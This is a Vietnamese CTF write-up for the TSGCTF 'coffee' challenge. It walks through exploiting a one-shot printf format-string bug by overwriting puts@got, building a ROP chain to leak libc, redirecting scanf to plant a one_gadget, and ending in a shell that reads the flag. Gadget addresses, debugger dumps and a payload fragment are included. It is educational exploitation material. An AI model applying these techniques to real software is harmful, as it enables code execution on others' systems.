# Phân tích file.

```python
coffee: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f06390409bc7bfd78cb08726dd89b4cd04d38f1a, for GNU/Linux 3.2.0, not stripped
```

```python
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- Có thể ghi đè got.

# Reverse file.

- Bài này tác giả cho source sẵn.

```python
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

- Ta dễ dàng thấy được có bug fmt ở printf(buf) nhưng ta chỉ sử dụng được 1 lần vì dùng xong nó set x=0.

# Exploit

- Mình sẽ overwrite got_puts về chuỗi ROP của mình để leak libc và đưa one_gadget vào got_puts.
- Sau khi overwrite got_puts mình thấy trên stack như sau:
    
    ```python
    00:0000│ rsp  0x7fffffffdef8 —▸ 0x401206 (main+112) ◂— mov    eax, 0
    01:0008│      0x7fffffffdf00 ◂— 0x3825783834373425 ('%4748x%8')
    02:0010│      0x7fffffffdf08 ◂— 0x62616161616e6824 ('$hnaaaab')
    03:0018│      0x7fffffffdf10 —▸ 0x404018 (puts@got.plt) —▸ 0x40128c (__libc_csu_init+92) ◂— pop    r12
    04:0020│      0x7fffffffdf18 —▸ 0x401293 (__libc_csu_init+99) ◂— pop    rdi
    ```
    
    - Để ret về được pop rdi thì ta phải pop 4 giá trị rác ở trên ra mình sẽ dùng gadget bên dưới. Mình sẽ ghi got_puts thành 0x40128c để pop 4 giá trị rác và ret về pop rdi.
        
        ```python
        0x000000000040128c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
        ```
        
    - Lúc này sẽ ret về pop rdi sau đó leak libc
        
        ```python
        [*] Printf: 0x7ffff7e2ae10
        [*] Base: 0x7ffff7dc6000
        [*] One: 0x7ffff7eacc81
        ```
        
    - Tiếp theo mình sẽ dùng scanf() để overwrite got_puts thành one_gadget, rsi sẽ chứa tham số buf, mình chỉ cần dùng gadget dưới để cho rsi thành got_puts rồi sau đó ret về main+40.
        
        ```python
        0x0000000000401291 : pop rsi ; pop r15 ; ret
        ```
        
        ```python
        RSI  0x404018 (puts@got.plt) —▸ 0x7ffff7e4d5a0 (puts) ◂— endbr64
        ► 0x4011ca <main+52>                call   __isoc99_scanf@plt <__isoc99_scanf@plt>
                format: 0x402004 ◂— 0x7962007339353125 /* '%159s' */
                vararg: 0x404018 (puts@got.plt) —▸ 0x7ffff7e4d5a0 (puts) ◂— endbr64
        ```
        
    - Nhập input là one_gadget là xong.
        
        ```python
        pwndbg> got
        [0x404018] puts@GLIBC_2.2.5 -> 0x7ffff7eacc81 (execvpe+641) ◂— mov    rsi, r15
        ```
        
    
    ```python
    [*] Printf: 0x7fe701506e10
    [*] Base: 0x7fe7014a2000
    [*] One: 0x7fe701588c81
    [*] Switching to interactive mode
    
    $ ls
    coffee
    flag-dcf095f41e7bf00fa7e7cf7ef2ce9083
    start.sh
    $ cat flag-dcf095f41e7bf00fa7e7cf7ef2ce9083
    TSGCTF{Uhouho_gori_gori_pwn}
    $
    ```
